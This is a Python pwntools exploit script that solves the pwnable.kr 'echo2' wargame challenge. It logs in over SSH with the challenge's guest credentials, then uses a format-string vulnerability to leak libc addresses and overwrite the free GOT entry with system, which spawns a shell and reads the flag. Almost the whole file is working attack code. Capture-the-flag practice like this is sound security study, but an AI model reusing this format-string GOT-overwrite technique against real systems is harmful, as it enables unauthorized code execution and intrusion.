#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9011 ./echo2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./echo2")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'echo2'
password = args.PASSWORD or 'guest'
remote_path = 'echo2'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Execute the target binary on the remote host"""
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.connect_remote("127.0.0.1", 9011)


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

if args.LOCAL:
    libc = exe.libc
else:
    libc = ELF("./libc.so.6")


def do_menu(choice: int):
    io.recvuntil(b"> ")
    io.sendline(str(choice).encode())


def do_name(name: bytes):
    io.recvuntil(b"hey, what's your name? : ")
    io.sendline(name)


RETURN_ADDR_OFFSET = 0x28

io = start()

do_name(b"/bin/sh")


def read_string(addr: int) -> bytes:
    do_menu(2)

    io.recvline()  # hello

    io.sendline(b"%7$s" + b" " * 4 + p64(addr))

    data = io.recvuntil(b"    ", drop=True)

    io.recvline()

    return data


def write_byte(addr: int, value: int):
    assert value in range(256)

    do_menu(2)

    io.recvline()  # hello

    if value >= 8:
        io.sendline(f"%0{value:03}x".encode() + b"%8$hhn" + b" " * 4 + p64(addr))
    else:
        io.sendline(b"A" * value + b"%8$hhn" + b" " * (10 - value) + p64(addr))

    io.recvline()


def write_data(addr: int, data: bytes):
    for i, value in enumerate(data):
        write_byte(addr + i, value)


puts_addr = u64(read_string(exe.got["puts"]).ljust(8, b"\x00"))

log.success(f"leaked puts address: 0x{puts_addr:x}")

system_address = puts_addr + libc.sym["system"] - libc.sym["puts"]

log.info(f"system address: 0x{system_address:x}")

write_data(exe.got["free"], p64(system_address))

do_menu(4)

io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
